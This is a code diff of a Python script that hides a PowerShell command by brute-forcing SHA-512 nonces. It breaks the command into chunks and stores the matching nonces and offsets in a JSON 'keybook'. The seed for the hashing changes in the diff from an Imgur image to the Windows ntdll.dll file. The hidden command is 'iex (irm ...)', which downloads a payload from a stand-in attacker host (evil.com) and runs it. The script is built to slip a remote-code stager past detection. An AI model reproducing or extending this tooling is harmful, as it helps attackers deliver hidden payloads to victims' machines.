@@ -1,22 +1,29 @@
 import hashlib
-import requests
-import re
 import json
 import os
 from concurrent.futures import ProcessPoolExecutor
 
 
-def get_direct_url(url):
-    if "i.imgur.com" in url: return url
-    match = re.search(r'imgur\.com/(?:gallery/|a/|r/[^/]+/|)?([a-zA-Z0-9]+)', url)
-    if match:
-        image_id = match.group(1)
-        return f"https://i.imgur.com/{image_id}.jpg"
-    return url
+def get_local_entropy(file_path):
+    """Fetches the first 5KB of entropy from a local file."""
+    if not os.path.exists(file_path):
+        raise FileNotFoundError(f"Local file not found: {file_path}")
+    with open(file_path, "rb") as f:
+        return f.read(5120)
+
+
+def chunk_payload(payload_string, chunk_size=4):
+    """
+    Automatically breaks a payload string into manageable chunks
+    to ensure the miner can brute-force them quickly.
+    """
+    chunks = [payload_string[i:i + chunk_size] for i in range(0, len(payload_string), chunk_size)]
+    print(f"[*] Payload automatically split into {len(chunks)} chunks of size {chunk_size}.")
+    return chunks
 
 
 def check_nonce_range(seed, target_hex, start_nonce, end_nonce):
-    """Worker function: Searching for Hexadecimal patterns."""
+    """Worker function: Searching for Hexadecimal patterns in SHA-512 hashes."""
     for nonce in range(start_nonce, end_nonce):
         hasher = hashlib.sha512()
         hasher.update(seed + str(nonce).encode())
@@ -27,17 +34,12 @@ def check_nonce_range(seed, target_hex, start_nonce, end_nonce):
     return None
 
 
-def mine_sequence(raw_url, target_list, output_file="keybook.json"):
-    direct_url = get_direct_url(raw_url)
-    headers = {"Range": "bytes=0-5120", "User-Agent": "Mozilla/5.0"}
-
+def mine_sequence(source_path, target_list, output_file="keybook1.json"):
     try:
-        response = requests.get(direct_url, headers=headers, timeout=15)
-        response.raise_for_status()
-        seed = response.content
-        print(f"[*] Entropy Source: {direct_url}")
+        seed = get_local_entropy(source_path)
+        print(f"[*] Entropy Source: {source_path}")
     except Exception as e:
-        print(f"[!] Error: {e}");
+        print(f"[!] Error: {e}")
         return None
 
     keybook = []
@@ -55,25 +57,36 @@ def mine_sequence(raw_url, target_list, output_file="keybook.json"):
                 for future in futures:
                     res = future.result()
                     if res:
-                        keybook.append({"t": target, "n": res["nonce"], "o": res["offset"], "l": len(target_hex)})
+                        keybook.append({
+                            "t": target,
+                            "n": res["nonce"],
+                            "o": res["offset"],
+                            "l": len(target_hex)
+                        })
                         print(f"    [+] Found at nonce {res['nonce']}")
                         found = True
                         break
                 current_start += (num_workers * batch_size)
 
+    final_data = {
+        "s": source_path,
+        "keys": keybook
+    }
+
     with open(output_file, 'w') as f:
-        json.dump({"u": direct_url, "keys": keybook}, f, indent=4)
+        json.dump(final_data, f, indent=6)
     print(f"\n[!] Keybook saved to {output_file}")
 
 
 if __name__ == '__main__':
-    img_url = "https://imgur.com/gallery/day-239-of-posting-calvin-hobbes-comics-every-day-o6z93xo"
+    # Using a universally present Windows DLL as the entropy source
+    source_file = r"C:\Windows\System32\ntdll.dll"
 
-    # CHUNKED SEQUENCE: Breaking the URL into 4-character blocks for speed
-    command_sequence = [
-        "iex", " ", "(", "irm", " ",
-        "'htt", "ps:/", "/www", ".evi", "l.co", "m/pa", "yloa", "d'",
-        ")"
-    ]
+    # 1. Define your full command string here
+    raw_command = "iex (irm 'https://www.evil.com/payload')"
 
-    mine_sequence(img_url, command_sequence)
+    # 2. Automatically chunk the string
+    command_targets = chunk_payload(raw_command, chunk_size=5)
+
+    # 3. Mine the sequence
+    mine_sequence(source_file, command_targets)
